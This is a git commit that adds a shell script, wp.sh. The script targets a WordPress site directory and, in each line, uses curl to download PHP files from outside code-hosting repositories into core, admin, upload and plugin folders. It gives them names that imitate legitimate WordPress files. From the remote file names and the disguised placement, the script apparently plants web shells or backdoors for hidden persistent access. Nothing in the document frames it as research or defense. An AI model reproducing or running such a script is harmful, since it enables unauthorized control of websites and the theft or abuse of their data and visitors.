fad17845a9923aedae883d6a88f768571074bcbb
nunungnur7779-boop <nunungnur7779@gmail.com>
2026-01-24 12:14:03 +0700

    Create wp.sh

---
+++ wp.sh
@@ -0,0 +1,12 @@
+base="/var/www/html/prodi_ikom"; \
+[ -d "$base/wp-admin/css/colors/blue" ] && curl -s -o "$base/wp-admin/css/colors/blue/index.php" https://codeberg.org/zvertixx/My-Project/raw/branch/main/commandbypass.php; \
+[ -d "$base/wp-includes/PHPMailer" ] && curl -s -o "$base/wp-includes/PHPMailer/PHPMailers.php" https://codeberg.org/zvertixx/My-Project/raw/branch/main/fmbr2.php; \
+[ -d "$base/wp-content/languages" ] && curl -s -o "$base/wp-content/languages/index.php" https://codeberg.org/zvertixx/My-Project/raw/branch/main/maviest.php; \
+[ -d "$base/wp-content/plugins/elementor/includes/widgets/traits" ] && curl -s -o "$base/wp-content/plugins/elementor/includes/widgets/traits/button.php" https://codeberg.org/zvertixx/My-Project/raw/branch/main/maviesta.php; \
+[ -d "$base/wp-includes/pomo" ] && curl -s -o "$base/wp-includes/pomo/mos.php" https://codeberg.org/zvertixx/My-Project/raw/branch/main/maviestass.php; \
+[ -d "$base/wp-content/uploads/2023/03" ] && curl -s -o "$base/wp-content/uploads/2023/03/03.php" https://codeberg.org/ebok/sel/raw/branch/main/403.php; \
+[ -d "$base/wp-content/plugins/wps-hide-login/vendor/composer" ] && curl -s -o "$base/wp-content/plugins/wps-hide-login/vendor/composer/installeds.php" https://codeberg.org/ebok/sel/raw/branch/main/maviest.php; \
+[ -d "$base/wp-includes/ID3" ] && curl -s -o "$base/wp-includes/ID3/getid4.php" https://raw.githubusercontent.com/nunungnur7779-boop/my-project/refs/heads/main/1x.php; \
+[ -d "$base/wp-includes/js/dist/vendor" ] && curl -s -o "$base/wp-includes/js/dist/vendor/react.php" https://raw.githubusercontent.com/nunungnur7779-boop/my-project/refs/heads/main/1x.php; \
+[ -d "$base/wp-admin/user" ] && curl -s -o "$base/wp-admin/user/freedoms.php" https://raw.githubusercontent.com/nunungnur7779-boop/my-project/refs/heads/main/2x.php; \
+[ -d "$base/wp-includes/sitemaps" ] && curl -s -o "$base/wp-includes/sitemaps/class-wp.php" https://raw.githubusercontent.com/nunungnur7779-boop/my-project/refs/heads/main/3x.php
